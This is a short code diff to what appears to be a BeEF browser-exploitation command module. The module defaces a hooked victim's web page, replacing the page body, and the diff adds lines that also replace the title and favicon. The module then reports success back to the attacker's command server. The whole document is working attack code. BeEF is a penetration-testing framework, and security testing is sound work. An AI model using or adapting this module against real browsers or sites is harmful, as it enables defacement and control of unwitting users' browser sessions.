@@ -14,7 +14,10 @@
 //   limitations under the License.
 //
 beef.execute(function() {
+
 	document.body.innerHTML = "<%= @deface_content %>";
+	document.title = "<%= @deface_title %>";
+	beef.browser.changeFavicon("<%= @deface_favicon %>");
 
     beef.net.send("<%= @command_url %>", <%= @command_id %>, "result=Deface Successful");
 });
